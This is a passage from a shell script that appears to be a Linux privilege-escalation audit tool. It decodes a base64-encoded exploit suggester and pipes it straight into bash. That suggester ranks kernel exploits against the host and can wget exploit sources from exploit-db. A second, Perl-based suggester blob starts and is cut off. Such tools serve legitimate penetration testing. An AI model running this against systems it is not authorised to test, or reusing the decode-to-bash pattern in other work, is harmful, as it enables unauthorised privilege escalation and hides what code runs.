lzdHJpYnV0aW9uOiAkKFsgLW4gIiRPUyIgXSAmJiBlY2hvIC1lICIke3R4dGdybn0kT1Mke3R4dHJzdH0iIHx8IGVjaG8gLWUgIiR7dHh0cmVkfU4vQSR7dHh0cnN0fSIpIgplY2hvIC1lICJEaXN0cmlidXRpb24gdmVyc2lvbjogJChbIC1uICIkRElTVFJPIiBdICYmIGVjaG8gLWUgIiR7dHh0Z3JufSRESVNUUk8ke3R4dHJzdH0iIHx8IGVjaG8gLWUgIiR7dHh0cmVkfU4vQSR7dHh0cnN0fSIpIgoKZWNobyAiQWRkaXRpb25hbCBjaGVja3MgKENPTkZJR18qLCBzeXNjdGwgZW50cmllcywgY3VzdG9tIEJhc2ggY29tbWFuZHMpOiAkKFsgIiRvcHRfc2tpcF9tb3JlX2NoZWNrcyIgPT0gImZhbHNlIiBdICYmIGVjaG8gLWUgIiR7dHh0Z3JufXBlcmZvcm1lZCR7dHh0cnN0fSIgfHwgZWNobyAtZSAiJHt0eHRyZWR9Ti9BJHt0eHRyc3R9IikiCgppZiBbIC1uICIkUEtHTElTVF9GSUxFIiAtYSAtbiAiJFBLR19MSVNUIiBdOyB0aGVuCiAgICBwa2dMaXN0RmlsZT0iJHt0eHRncm59JFBLR0xJU1RfRklMRSR7dHh0cnN0fSIKZWxpZiBbIC1uICIkUEtHTElTVF9GSUxFIiBdOyB0aGVuCiAgICBwa2dMaXN0RmlsZT0iJHt0eHRyZWR9dW5yZWNvZ25pemVkIGZpbGUgcHJvdmlkZWQke3R4dHJzdH0iCmVsaWYgWyAtbiAiJFBLR19MSVNUIiBdOyB0aGVuCiAgICBwa2dMaXN0RmlsZT0iJHt0eHRncm59ZnJvbSBjdXJyZW50IE9TJHt0eHRyc3R9IgpmaQoKZWNobyAtZSAiUGFja2FnZSBsaXN0aW5nOiAkKFsgLW4gIiRwa2dMaXN0RmlsZSIgXSAmJiBlY2hvIC1lICIkcGtnTGlzdEZpbGUiIHx8IGVjaG8gLWUgIiR7dHh0cmVkfU4vQSR7dHh0cnN0fSIpIgoKIyBoYW5kbGUgLS1rZXJuZWxzcGFjeS1vbmx5ICYgLS11c2Vyc3BhY2Utb25seSBmaWx0ZXIgb3B0aW9ucwppZiBbICIkb3B0X2tlcm5lbF9vbmx5IiA9ICJ0cnVlIiAtbyAteiAiJFBLR19MSVNUIiBdOyB0aGVuCiAgICB1bnNldCBFWFBMT0lUU19VU0VSU1BBQ0UKICAgIGRlY2xhcmUgLUEgRVhQTE9JVFNfVVNFUlNQQUNFCmZpCgppZiBbICIkb3B0X3VzZXJzcGFjZV9vbmx5IiA9ICJ0cnVlIiBdOyB0aGVuCiAgICB1bnNldCBFWFBMT0lUUwogICAgZGVjbGFyZSAtQSBFWFBMT0lUUwpmaQoKZWNobwplY2hvIC1lICIke2JsZHdodH1TZWFyY2hpbmcgYW1vbmc6JHt0eHRyc3R9IgplY2hvCmVjaG8gIiR7I0VYUExPSVRTW0BdfSBrZXJuZWwgc3BhY2UgZXhwbG9pdHMiCmVjaG8gIiR7I0VYUExPSVRTX1VTRVJTUEFDRVtAXX0gdXNlciBzcGFjZSBleHBsb2l0cyIKZWNobwoKZWNobyAtZSAiJHtibGR3aHR9UG9zc2libGUgRXhwbG9pdHM6JHt0eHRyc3R9IgplY2hvCgojIHN0YXJ0IGFuYWx5c2lzCmo9MApmb3IgRVhQIGluICIke0VYUExPSVRTW0BdfSIgIiR7RVhQTE9JVFNfVVNFUlNQQUNFW0BdfSI7IGRvCgogICAgIyBjcmVhdGUgYXJyYXkgZnJvbSBjdXJyZW50IGV4cGxvaXQgaGVyZSBkb2MgYW5kIGZldGNoIG5lZWRlZCBsaW5lcwogICAgaT0wCiAgICAjICgnLXInIGlzIHVzZWQgdG8gbm90IGludGVycHJldCBiYWNrc2xhc2ggdXNlZCBmb3IgYmFzaCBjb2xvcnMpCiAgICB3aGlsZSByZWFkIC1yIGxpbmUKICAgIGRvCiAgICAgICAgYXJyW2ldPSIkbGluZSIKICAgICAgICBpPSQoKGkgKyAxKSkKICAgIGRvbmUgPDw8ICIkRVhQIgoKICAgIE5BTUU9IiR7YXJyWzBdfSIgJiYgTkFNRT0iJHtOQU1FOjZ9IgogICAgUkVRUz0iJHthcnJbMV19IiAmJiBSRVFTPSIke1JFUVM6Nn0iCiAgICBUQUdTPSIke2FyclsyXX0iICYmIFRBR1M9IiR7VEFHUzo2fSIKICAgIFJBTks9IiR7YXJyWzNdfSIgJiYgUkFOSz0iJHtSQU5LOjZ9IgoKICAgICMgc3BsaXQgbGluZSB3aXRoIHJlcXVpcmVtZW50cyAmIGxvb3AgdGhydSBhbGwgcmVxcyBvbmUgYnkgb25lICYgY2hlY2sgd2hldGhlciBpdCBpcyBtZXQKICAgIElGUz0nLCcgcmVhZCAtciAtYSBhcnJheSA8PDwgIiRSRVFTIgogICAgUkVRU19OVU09JHsjYXJyYXlbQF19CiAgICBQQVNTRURfUkVRPTAKICAgIGZvciBSRVEgaW4gIiR7YXJyYXlbQF19IjsgZG8KICAgICAgICBpZiAoY2hlY2tSZXF1aXJlbWVudCAiJFJFUSIgIiR7YXJyYXlbMF19Iik7IHRoZW4KICAgICAgICAgICAgUEFTU0VEX1JFUT0kKCgkUEFTU0VEX1JFUSArIDEpKQogICAgICAgIGVsc2UKICAgICAgICAgICAgYnJlYWsKICAgICAgICBmaQogICAgZG9uZQoKICAgICMgZXhlY3V0ZSBmb3IgZXhwbG9pdHMgd2l0aCBhbGwgcmVxdWlyZW1lbnRzIG1ldAogICAgaWYgWyAkUEFTU0VEX1JFUSAtZXEgJFJFUVNfTlVNIF07IHRoZW4KCiAgICAgICAgIyBhZGRpdGlvbmFsIHJlcXVpcmVtZW50IGZvciAtLWN2ZWxpc3QtZmlsZSBtb2RlOiBjaGVjayBpZiBDVkUgYXNzb2NpYXRlZCB3aXRoIHRoZSBleHBsb2l0IGlzIG9uIHRoZSBDVkVMSVNUX0ZJTEUKICAgICAgICBpZiBbICIkb3B0X2N2ZWxpc3RfZmlsZSIgPSAidHJ1ZSIgXTsgdGhlbgoKICAgICAgICAgICAgIyBleHRyYWN0IENWRShzKSBhc3NvY2lhdGVkIHdpdGggZ2l2ZW4gZXhwbG9pdCAoYWxzbyB0cmFuc2xhdGVzICcsJyB0byAnfCcgZm9yIGVhc3kgaGFuZGxpbmcgbXVsdGlwbGUgQ1ZFcyBjYXNlIC0gdmlhIGV4dGVuZGVkIHJlZ2V4KQogICAgICAgICAgICBjdmU9JChlY2hvICIkTkFNRSIgfCBncmVwICcuKlxbLipcXS4qJyB8IGN1dCAtZCAnbScgLWYyIHwgY3V0IC1kICddJyAtZjEgfCB0ciAtZCAnWycgfCB0ciAiLCIgInwiKQogICAgICAgICAgICAjZWNobyAiQ1ZFOiAkY3ZlIgoKICAgICAgICAgICAgIyBjaGVjayBpZiBpdCdzIG9uIENWRUxJU1RfRklMRSBsaXN0LCBpZiBubyBtb3ZlIHRvIG5leHQgZXhwbG9pdAogICAgICAgICAgICBbICEgJChjYXQgIiRDVkVMSVNUX0ZJTEUiIHwgZ3JlcCAtRSAiJGN2ZSIpIF0gJiYgY29udGludWUKICAgICAgICBmaQoKICAgICAgICAjIHByb2Nlc3MgdGFncyBhbmQgaGlnaGxpZ2h0IHRob3NlIHRoYXQgbWF0Y2ggY3VycmVudCBPUyAob25seSBmb3IgZGVifHVidW50dXxSSEVMIGFuZCBpZiB3ZSBrbm93IGRpc3RybyB2ZXJzaW9uIC0gZGlyZWN0IG1vZGUpCiAgICAgICAgdGFncz0iIgogICAgICAgIGlmIFsgLW4gIiRUQUdTIiAtYSAtbiAiJE9TIiBdOyB0aGVuCiAgICAgICAgICAgIElGUz0nLCcgcmVhZCAtciAtYSB0YWdzX2FycmF5IDw8PCAiJFRBR1MiCiAgICAgICAgICAgIFRBR1NfTlVNPSR7I3RhZ3NfYXJyYXlbQF19CgogICAgICAgICAgICAjIGJ1bXAgUkFOSyBzbGlnaHRseSAoKzEpIGlmIHdlJ3JlIGluICctLXVuYW1lJyBtb2RlIGFuZCB0aGVyZSdzIGEgVEFHIGZvciBPUyBmcm9tIHVuYW1lIHN0cmluZwogICAgICAgICAgICBbICIkKGVjaG8gIiR7dGFnc19hcnJheVtAXX0iIHwgZ3JlcCAiJE9TIikiIC1hICIkb3B0X3VuYW1lX3N0cmluZyIgPT0gInRydWUiIF0gJiYgUkFOSz0kKCgkUkFOSyArIDEpKQoKICAgICAgICAgICAgZm9yIFRBRyBpbiAiJHt0YWdzX2FycmF5W0BdfSI7IGRvCiAgICAgICAgICAgICAgICB0YWdfZGlzdHJvPSQoZWNobyAiJFRBRyIgfCBjdXQgLWQnPScgLWYxKQogICAgICAgICAgICAgICAgdGFnX2Rpc3Ryb19udW1fYWxsPSQoZWNobyAiJFRBRyIgfCBjdXQgLWQnPScgLWYyKQogICAgICAgICAgICAgICAgIyBpbiBjYXNlIG9mIHRhZyBvZiBmb3JtOiAndWJ1bnR1PTE2LjA0e2tlcm5lbDo0LjQuMC0yMX0gcmVtb3ZlIGtlcm5lbCB2ZXJzaW9uaW5nIHBhcnQgZm9yIGNvbXBhcmlzaW9uCiAgICAgICAgICAgICAgICB0YWdfZGlzdHJvX251bT0iJHt0YWdfZGlzdHJvX251bV9hbGwleyp9IgoKICAgICAgICAgICAgICAgICMgd2UncmUgaW4gJy0tdW5hbWUnIG1vZGUgT1IgKGZvciBub3JtYWwgbW9kZSkgaWYgdGhlcmUgaXMgZGlzdHJvIHZlcnNpb24gbWF0Y2gKICAgICAgICAgICAgICAgIGlmIFsgIiRvcHRfdW5hbWVfc3RyaW5nIiA9PSAidHJ1ZSIgLW8gXCggIiRPUyIgPT0gIiR0YWdfZGlzdHJvIiAtYSAiJChlY2hvICIkRElTVFJPIiB8IGdyZXAgLUUgIiR0YWdfZGlzdHJvX251bSIpIiBcKSBdOyB0aGVuCgogICAgICAgICAgICAgICAgICAgICMgYnVtcCBjdXJyZW50IGV4cGxvaXQncyByYW5rIGJ5IDIgZm9yIGRpc3RybyBtYXRjaCAoYW5kIG5vdCBpbiAnLS11bmFtZScgbW9kZSkKICAgICAgICAgICAgICAgICAgICBbICIkb3B0X3VuYW1lX3N0cmluZyIgPT0gImZhbHNlIiBdICYmIFJBTks9JCgoJFJBTksgKyAyKSkKCiAgICAgICAgICAgICAgICAgICAgIyBnZXQgbmFtZSAoa2VybmVsIG9yIHBhY2thZ2UgbmFtZSkgYW5kIHZlcnNpb24gb2Yga2VybmVsL3BrZyBpZiBwcm92aWRlZDoKICAgICAgICAgICAgICAgICAgICB0YWdfcGtnPSQoZWNobyAiJHRhZ19kaXN0cm9fbnVtX2FsbCIgfCBjdXQgLWQneycgLWYgMiB8IHRyIC1kICd9JyB8IGN1dCAtZCc6JyAtZiAxKQogICAgICAgICAgICAgICAgICAgIHRhZ19wa2dfbnVtPSIiCiAgICAgICAgICAgICAgICAgICAgWyAkKGVjaG8gIiR0YWdfZGlzdHJvX251bV9hbGwiIHwgZ3JlcCAneycpIF0gJiYgdGFnX3BrZ19udW09JChlY2hvICIkdGFnX2Rpc3Ryb19udW1fYWxsIiB8IGN1dCAtZCd7JyAtZiAyIHwgdHIgLWQgJ30nIHwgY3V0IC1kJzonIC1mIDIpCgogICAgICAgICAgICAgICAgICAgICNbIC1uICIkdGFnX3BrZ19udW0iIF0gJiYgZWNobyAidGFnX3BrZ19udW06ICR0YWdfcGtnX251bTsga2VybmVsOiAkS0VSTkVMX0FMTCIKCiAgICAgICAgICAgICAgICAgICAgIyBpZiBwa2cva2VybmVsIHZlcnNpb24gaXMgbm90IHByb3ZpZGVkOgogICAgICAgICAgICAgICAgICAgIGlmIFsgLXogIiR0YWdfcGtnX251bSIgXTsgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBbICIkb3B0X3VuYW1lX3N0cmluZyIgPT0gImZhbHNlIiBdICYmIFRBRz0iJHtsaWdodHllbGxvd31bICR7VEFHfSBdJHt0eHRyc3R9IgoKICAgICAgICAgICAgICAgICAgICAjIGtlcm5lbCB2ZXJzaW9uIHByb3ZpZGVkLCBjaGVjayBmb3IgbWF0Y2g6CiAgICAgICAgICAgICAgICAgICAgZWxpZiBbIC1uICIkdGFnX3BrZ19udW0iIC1hICIkdGFnX3BrZyIgPSAia2VybmVsIiBdOyB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIFsgJChlY2hvICIkS0VSTkVMX0FMTCIgfCBncmVwIC1FICIke3RhZ19wa2dfbnVtfSIpIF07IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICMga2VybmVsIHZlcnNpb24gbWF0Y2hlZCAtIGJvbGQgaGlnaGxpZ2h0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUQUc9IiR7eWVsbG93fVsgJHtUQUd9IF0ke3R4dHJzdH0iCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBidW1wIGN1cnJlbnQgZXhwbG9pdCdzIHJhbmsgYWRkaXRpb25hbGx5IGJ5IDMgZm9yIGtlcm5lbCB2ZXJzaW9uIHJlZ2V4IG1hdGNoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBSQU5LPSQoKCRSQU5LICsgMykpCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsgIiRvcHRfdW5hbWVfc3RyaW5nIiA9PSAiZmFsc2UiIF0gJiYgVEFHPSIke2xpZ2h0eWVsbG93fVsgJHRhZ19kaXN0cm89JHRhZ19kaXN0cm9fbnVtIF0ke3R4dHJzdH17a2VybmVsOiR0YWdfcGtnX251bX0iCiAgICAgICAgICAgICAgICAgICAgICAgIGZpCgogICAgICAgICAgICAgICAgICAgICMgcGtnIHZlcnNpb24gcHJvdmlkZWQsIGNoZWNrIGZvciBtYXRjaCAoVEJEKToKICAgICAgICAgICAgICAgICAgICBlbGlmIFsgLW4gIiR0YWdfcGtnX251bSIgLWEgLW4gIiR0YWdfcGtnIiAgXTsgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBUQUc9IiR7bGlnaHR5ZWxsb3d9WyAkdGFnX2Rpc3Rybz0kdGFnX2Rpc3Ryb19udW0gXSR7dHh0cnN0fXskdGFnX3BrZzokdGFnX3BrZ19udW19IgogICAgICAgICAgICAgICAgICAgIGZpCgogICAgICAgICAgICAgICAgZmkKCiAgICAgICAgICAgICAgICAjIGFwcGVuZCBjdXJyZW50IHRhZyB0byB0YWdzIGxpc3QKICAgICAgICAgICAgICAgIHRhZ3M9IiR7dGFnc30ke1RBR30sIgogICAgICAgICAgICBkb25lCiAgICAgICAgICAgICMgdHJpbSAnLCcgYWRkZWQgYnkgYWJvdmUgbG9vcAogICAgICAgICAgICBbIC1uICIkdGFncyIgXSAmJiB0YWdzPSIke3RhZ3MlP30iCiAgICAgICAgZWxzZQogICAgICAgICAgICB0YWdzPSIkVEFHUyIKICAgICAgICBmaQoKICAgICAgICAjIGluc2VydCB0aGUgbWF0Y2hlZCBleHBsb2l0ICh3aXRoIGNhbGN1bGF0ZWQgUmFuayBhbmQgaGlnaGxpZ2h0ZWQgdGFncykgdG8gYXJyYXJ5IHRoYXQgd2lsbCBiZSBzb3J0ZWQKICAgICAgICBFWFA9JChlY2hvICIkRVhQIiB8IHNlZCAtZSAnL15OYW1lOi9kJyAtZSAnL15SZXFzOi9kJyAtZSAnL15UYWdzOi9kJykKICAgICAgICBleHBsb2l0c190b19zb3J0W2pdPSIke1JBTkt9TmFtZTogJHtOQU1FfUQzTDFtUmVxczogJHtSRVFTfUQzTDFtVGFnczogJHt0YWdzfUQzTDFtJChlY2hvICIkRVhQIiB8IHNlZCAtZSAnOmEnIC1lICdOJyAtZSAnJCFiYScgLWUgJ3MvXG4vRDNMMW0vZycpIgogICAgICAgICgoaisrKSkKICAgIGZpCmRvbmUKCiMgc29ydCBleHBsb2l0cyBiYXNlZCBvbiBjYWxjdWxhdGVkIFJhbmsKSUZTPSQnXG4nClNPUlRFRF9FWFBMT0lUUz0oJChzb3J0IC1yIDw8PCIke2V4cGxvaXRzX3RvX3NvcnRbKl19IikpCnVuc2V0IElGUwoKIyBkaXNwbGF5IHNvcnRlZCBleHBsb2l0cwpmb3IgRVhQX1RFTVAgaW4gIiR7U09SVEVEX0VYUExPSVRTW0BdfSI7IGRvCgoJUkFOSz0kKGVjaG8gIiRFWFBfVEVNUCIgfCBhd2sgLUYnTmFtZTonICd7cHJpbnQgJDF9JykKCgkjIGNvbnZlcnQgZW50cnkgYmFjayB0byBjYW5vbmljYWwgZm9ybQoJRVhQPSQoZWNobyAiJEVYUF9URU1QIiB8IHNlZCAncy9eWzAtOV0vL2cnIHwgc2VkICdzL0QzTDFtL1xuL2cnKQoKCSMgY3JlYXRlIGFycmF5IGZyb20gY3VycmVudCBleHBsb2l0IGhlcmUgZG9jIGFuZCBmZXRjaCBuZWVkZWQgbGluZXMKICAgIGk9MAogICAgIyAoJy1yJyBpcyB1c2VkIHRvIG5vdCBpbnRlcnByZXQgYmFja3NsYXNoIHVzZWQgZm9yIGJhc2ggY29sb3JzKQogICAgd2hpbGUgcmVhZCAtciBsaW5lCiAgICBkbwogICAgICAgIGFycltpXT0iJGxpbmUiCiAgICAgICAgaT0kKChpICsgMSkpCiAgICBkb25lIDw8PCAiJEVYUCIKCiAgICBOQU1FPSIke2FyclswXX0iICYmIE5BTUU9IiR7TkFNRTo2fSIKICAgIFJFUVM9IiR7YXJyWzFdfSIgJiYgUkVRUz0iJHtSRVFTOjZ9IgogICAgVEFHUz0iJHthcnJbMl19IiAmJiB0YWdzPSIke1RBR1M6Nn0iCgoJRVhQTE9JVF9EQj0kKGVjaG8gIiRFWFAiIHwgZ3JlcCAiZXhwbG9pdC1kYjogIiB8IGF3ayAne3ByaW50ICQyfScpCglhbmFseXNpc191cmw9JChlY2hvICIkRVhQIiB8IGdyZXAgImFuYWx5c2lzLXVybDogIiB8IGF3ayAne3ByaW50ICQyfScpCglleHRfdXJsPSQoZWNobyAiJEVYUCIgfCBncmVwICJleHQtdXJsOiAiIHwgYXdrICd7cHJpbnQgJDJ9JykKCWNvbW1lbnRzPSQoZWNobyAiJEVYUCIgfCBncmVwICJDb21tZW50czogIiB8IGN1dCAtZCcgJyAtZiAyLSkKCXJlcXM9JChlY2hvICIkRVhQIiB8IGdyZXAgIlJlcXM6ICIgfCBjdXQgLWQnICcgLWYgMikKCgkjIGV4cGxvaXQgbmFtZSB3aXRob3V0IENWRSBudW1iZXIgYW5kIHdpdGhvdXQgY29tbW9ubHkgdXNlZCBzcGVjaWFsIGNoYXJzCgluYW1lPSQoZWNobyAiJE5BTUUiIHwgY3V0IC1kJyAnIC1mIDItIHwgdHIgLWQgJyAoKS8nKQoKCWJpbl91cmw9JChlY2hvICIkRVhQIiB8IGdyZXAgImJpbi11cmw6ICIgfCBhd2sgJ3twcmludCAkMn0nKQoJc3JjX3VybD0kKGVjaG8gIiRFWFAiIHwgZ3JlcCAic3JjLXVybDogIiB8IGF3ayAne3ByaW50ICQyfScpCglbIC16ICIkc3JjX3VybCIgXSAmJiBbIC1uICIkRVhQTE9JVF9EQiIgXSAmJiBzcmNfdXJsPSJodHRwczovL3d3dy5leHBsb2l0LWRiLmNvbS9kb3dubG9hZC8kRVhQTE9JVF9EQiIKCVsgLXogIiRzcmNfdXJsIiBdICYmIFsgLXogIiRiaW5fdXJsIiBdICYmIGV4aXRXaXRoRXJyTXNnICInc3JjLXVybCcgLyAnYmluLXVybCcgLyAnZXhwbG9pdC1kYicgZW50cmllcyBhcmUgYWxsIGVtcHR5IGZvciAnJE5BTUUnIGV4cGxvaXQgLSBmaXggdGhhdC4gQWJvcnRpbmcuIgoKCWlmIFsgLW4gIiRhbmFseXNpc191cmwiIF07IHRoZW4KICAgICAgICBkZXRhaWxzPSIkYW5hbHlzaXNfdXJsIgoJZWxpZiAkKGVjaG8gIiRzcmNfdXJsIiB8IGdyZXAgLXEgJ3d3dy5leHBsb2l0LWRiLmNvbScpOyB0aGVuCiAgICAgICAgZGV0YWlscz0iaHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvJEVYUExPSVRfREIvIgoJZWxpZiBbWyAiJHNyY191cmwiID1+IF4uKnRnenx0YXIuZ3p8emlwJCAmJiAtbiAiJEVYUExPSVRfREIiIF1dOyB0aGVuCiAgICAgICAgZGV0YWlscz0iaHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvJEVYUExPSVRfREIvIgoJZWxzZQogICAgICAgIGRldGFpbHM9IiRzcmNfdXJsIgoJZmkKCgkjIHNraXAgRG9TIGJ5IGRlZmF1bHQKCWRvcz0kKGVjaG8gIiRFWFAiIHwgZ3JlcCAtbyAtaSAiKGRvcyIpCglbICIkb3B0X3Nob3dfZG9zIiA9PSAiZmFsc2UiIF0gJiYgWyAtbiAiJGRvcyIgXSAmJiBjb250aW51ZQoKCSMgaGFuZGxlcyAtLWZldGNoLWJpbmFyaWVzIG9wdGlvbgoJaWYgWyAkb3B0X2ZldGNoX2JpbnMgPSAidHJ1ZSIgXTsgdGhlbgogICAgICAgIGZvciBpIGluICQoZWNobyAiJEVYUCIgfCBncmVwICJiaW4tdXJsOiAiIHwgYXdrICd7cHJpbnQgJDJ9Jyk7IGRvCiAgICAgICAgICAgIFsgLWYgIiR7bmFtZX1fJChiYXNlbmFtZSAkaSkiIF0gJiYgcm0gLWYgIiR7bmFtZX1fJChiYXNlbmFtZSAkaSkiCiAgICAgICAgICAgIHdnZXQgLXEgLWsgIiRpIiAtTyAiJHtuYW1lfV8kKGJhc2VuYW1lICRpKSIKICAgICAgICBkb25lCiAgICBmaQoKCSMgaGFuZGxlcyAtLWZldGNoLXNvdXJjZXMgb3B0aW9uCglpZiBbICRvcHRfZmV0Y2hfc3JjcyA9ICJ0cnVlIiBdOyB0aGVuCiAgICAgICAgWyAtZiAiJHtuYW1lfV8kKGJhc2VuYW1lICRzcmNfdXJsKSIgXSAmJiBybSAtZiAiJHtuYW1lfV8kKGJhc2VuYW1lICRzcmNfdXJsKSIKICAgICAgICB3Z2V0IC1xIC1rICIkc3JjX3VybCIgLU8gIiR7bmFtZX1fJChiYXNlbmFtZSAkc3JjX3VybCkiICYKICAgIGZpCgogICAgIyBkaXNwbGF5IHJlc3VsdCAoc2hvcnQpCglpZiBbICIkb3B0X3N1bW1hcnkiID0gInRydWUiIF07IHRoZW4KCVsgLXogIiR0YWdzIiBdICYmIHRhZ3M9Ii0iCgllY2hvIC1lICIkTkFNRSB8fCAkdGFncyB8fCAkc3JjX3VybCIKCWNvbnRpbnVlCglmaQoKIyBkaXNwbGF5IHJlc3VsdCAoc3RhbmRhcmQpCgllY2hvIC1lICJbK10gJE5BTUUiCgllY2hvIC1lICJcbiAgIERldGFpbHM6ICRkZXRhaWxzIgogICAgICAgIGVjaG8gLWUgIiAgIEV4cG9zdXJlOiAkKGRpc3BsYXlFeHBvc3VyZSAkUkFOSykiCiAgICAgICAgWyAtbiAiJHRhZ3MiIF0gJiYgZWNobyAtZSAiICAgVGFnczogJHRhZ3MiCiAgICAgICAgZWNobyAtZSAiICAgRG93bmxvYWQgVVJMOiAkc3JjX3VybCIKICAgICAgICBbIC1uICIkZXh0X3VybCIgXSAmJiBlY2hvIC1lICIgICBleHQtdXJsOiAkZXh0X3VybCIKICAgICAgICBbIC1uICIkY29tbWVudHMiIF0gJiYgZWNobyAtZSAiICAgQ29tbWVudHM6ICRjb21tZW50cyIKCiAgICAgICAgIyBoYW5kbGVzIC0tZnVsbCBmaWx0ZXIgb3B0aW9uCiAgICAgICAgaWYgWyAiJG9wdF9mdWxsIiA9ICJ0cnVlIiBdOyB0aGVuCiAgICAgICAgICAgIFsgLW4gIiRyZXFzIiBdICYmIGVjaG8gLWUgIiAgIFJlcXVpcmVtZW50czogJHJlcXMiCgogICAgICAgICAgICBbIC1uICIkRVhQTE9JVF9EQiIgXSAmJiBlY2hvIC1lICIgICBleHBsb2l0LWRiOiAkRVhQTE9JVF9EQiIKCiAgICAgICAgICAgIGF1dGhvcj0kKGVjaG8gIiRFWFAiIHwgZ3JlcCAiYXV0aG9yOiAiIHwgY3V0IC1kJyAnIC1mIDItKQogICAgICAgICAgICBbIC1uICIkYXV0aG9yIiBdICYmIGVjaG8gLWUgIiAgIGF1dGhvcjogJGF1dGhvciIKICAgICAgICBmaQoKICAgICAgICBlY2hvCgpkb25lCg=="
    echo $les_b64 | base64 -d | bash | sed "s,$(printf '\033')\\[[0-9;]*[a-zA-Z],,g" | grep -i "\[CVE" -A 10 | grep -Ev "^\-\-$" | sed -${E} "s,\[CVE-[0-9]+-[0-9]+\].*,${SED_RED},g"
    echo ""
fi

if [ "$(command -v perl 2>/dev/null)" ]; then
    print_2title "Executing Linux Exploit Suggester 2"
    print_info "https://github.com/jondonas/linux-exploit-suggester-2"
    les2_b64="IyEvdXNyL2Jpbi9wZXJsCnVzZSBzdHJpY3Q7CnVzZSB3YXJuaW5nczsKdXNlIEdldG9wdDo6U3RkOwoKb3VyICRWRVJTSU9OID0gJzInOwoKbXkgJW9wdHM7CmdldG9wdHMoICdrOmhkJywgXCVvcHRzICk7CmlmIChleGlzdHMgJG9wdHN7aH0pIHsKICAgIHVzYWdlKCk7CiAgICBleGl0Owp9OwoKcHJpbnRfYmFubmVyKCk7Cm15ICggJGtob3N0LCAkaXNfcGFydGlhbCApID0gZ2V0X2tlcm5lbCgpOwpwcmludCAiICBMb2NhbCBLZXJuZWw6IFxlWzAwOzMzbSRraG9zdFxlWzAwbVxuIjsKCm15ICVleHBsb2l0cyA9IGdldF9leHBsb2l0cygpOwpwcmludCAnICBTZWFyY2hpbmcgJyAuIHNjYWxhciBrZXlzKCVleHBsb2l0cykgLiAiIGV4cGxvaXRzLi4uXG5cbiI7CnByaW50ICIgIFxlWzE7MzVtUG9zc2libGUgRXhwbG9pdHNcZVswMG1cbiI7CgpteSAkY291bnQgPSAxOwpteSBAYXBwbGljYWJsZSA9ICgpOwpFWFBMT0lUOgpmb3JlYWNoIG15ICRrZXkgKCBzb3J0IGtleXMgJWV4cGxvaXRzICkgewogICAgZm9yZWFjaCBteSAka2VybmVsICggQHsgJGV4cGxvaXRzeyRrZXl9e3Z1bG59IH0gKSB7CgogICAgICAgIGlmICggICAgICRraG9zdCBlcSAka2VybmVsCiAgICAgICAgICAgICAgb3IgKCAkaXNfcGFydGlhbCBhbmQgaW5kZXgoJGtlcm5lbCwka2hvc3QpID09IDAgKQogICAgICAgICkgewogICAgICAgICAgICAkZXhwbG9pdHN7JGtleX17a2V5fSA9ICRrZXk7CiAgICAgICAgICAgIHB1c2goQGFwcGxpY2FibGUsICRleHBsb2l0c3ska2V5fSk7CiAgICAgICAgICAgIHByaW50ICIgIFxlWzAwOzMzbVtcZVswMG1cZVswMDszMW0kY291bnRcZVswMG1cZVswMDszM21dXGVbMDBtICI7CiAgICAgICAgICAgIHByaW50ICJcZVswMDszM20ka2V5XGVbMDBtIjsKICAgICAgICAgICAgcHJpbnQgIiBcZVswMDszM20oJGtlcm5lbClcZVswMG0iIGlmICRpc19wYXJ0aWFsOwoKICAgICAgICAgICAgbXkgJGFsdCA9ICRleHBsb2l0c3ska2V5fXthbHR9OwogICAgICAgICAgICBteSAkY3ZlID0gJGV4cGxvaXRzeyRrZXl9e2N2ZX07CiAgICAgICAgICAgIG15ICRtbHcgPSAkZXhwbG9pdHN7JGtleX17bWlsfTsKICAgICAgICAgICAgaWYgKCAkYWx0IG9yICRjdmUgKSB7CiAgICAgICAgICAgICAgICBwcmludCAiXG4iOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICggJGFsdCApIHsgcHJpbnQgIiAgICAgIEFsdDogJGFsdCAiOyB9CiAgICAgICAgICAgIGlmICggJGN2ZSApIHsgcHJpbnQgIiAgICAgIENWRS0kY3ZlIjsgfQogICAgICAgICAgICBpZiAoICRtbHcgKSB7IHByaW50ICJcbiAgICAgIFNvdXJjZTogJG1sdyI7IH0KICAgICAgICAgICAgcHJpbnQgIlxuIjsKICAgICAgICAgICAgJGNvdW50ICs9IDE7CiAgICAgICAgICAgIG5leHQgRVhQTE9JVDsKICAgICAgICB9CiAgICB9Cn0KcHJpbnQgIlxuIjsKCmlmICghQGFwcGxpY2FibGUpIHsKICAgIHByaW50ICIgIE5vIGV4cGxvaXRzIGFyZSBhdmFpbGFibGUgZm9yIHRoaXMga2VybmVsIHZlcnNpb25cblxuIjsKICAgIGV4aXQ7Cn0KCmlmIChleGlzdHMgJG9wdHN7ZH0pIHsKICAgIHByaW50ICIgIFxlWzE7MzZtRXhwbG9pdCBEb3dubG9hZFxlWzAwbVxuIjsKICAgIHByaW50ICIgIChEb3dubG9hZCBhbGw6IFxlWzAwOzMzbSdhJ1xlWzAwbSAvIEluZGl2aWR1YWxseTogXGVbMDA7MzNtJzIsNCw1J1xlWzAwbSAiOwogICAgcHJpbnQgIi8gRXhpdDogXGVbMDA7MzNtXmNcZVswMG0pXG4iOwogICAgcHJpbnQgIiAgU2VsZWN0IGV4cGxvaXRzIHRvIGRvd25sb2FkOiAiOwoKICAgIHdoaWxlICgxKSB7CiAgICAgICAgbXkgJGlucHV0ID0gPFNURElOPjsKICAgICAgICAkaW5wdXQgPX4gcy9ccysvL2c7CgogICAgICAgIGlmICgkaW5wdXQgPX4gL15hJC8pIHsKICAgICAgICAgICAgbXkgQHNlbGVjdGVkID0gKCk7CiAgICAgICAgICAgIGZvciAobXkgJGk9MTsgJGkgPD0gc2NhbGFyIEBhcHBsaWNhYmxlOyAkaSsrKSB7CiAgICAgICAgICAgICAgIHB1c2goQHNlbGVjdGVkLCAkaSk7CiAgIC